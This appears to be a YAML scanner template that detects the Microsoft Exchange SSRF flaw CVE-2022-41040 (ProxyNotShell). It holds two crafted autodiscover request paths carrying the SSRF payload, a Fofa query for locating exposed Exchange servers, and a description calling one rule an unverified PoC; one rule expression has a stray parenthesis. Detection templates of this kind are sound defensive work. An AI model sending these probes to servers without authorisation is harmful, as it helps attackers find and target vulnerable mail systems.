expression: r0() || r1()
id: CVE-2022-41040
info:
  author: zan8in
  description: "r0 \u662F nmap \u811A\u672C  r1 \u662F github \u672A\u7ECF\u9A8C\u8BC1\
    \u5F97 PoC\nFofa: app=\"Microsoft-Exchange\"\n"
  name: Microsoft Exchange SSRF
  reference:
  - https://github.com/numanturle/CVE-2022-41040
  - https://blog.csdn.net/dnoir/article/details/127151209
  severity: high
rules:
  r0:
    expression: response.status == 302 && response.raw_header.ibcontains(b'x-feserver'))
    request:
      method: GET
      path: /autodiscover/autodiscover.json?a@foo.var/owa/&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell
  r1:
    expression: response.body.bcontains(b'IIS Web Core') && response.raw_header.bcontains(b'X-BackEndCookie')
    request:
      method: GET
      path: /autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL
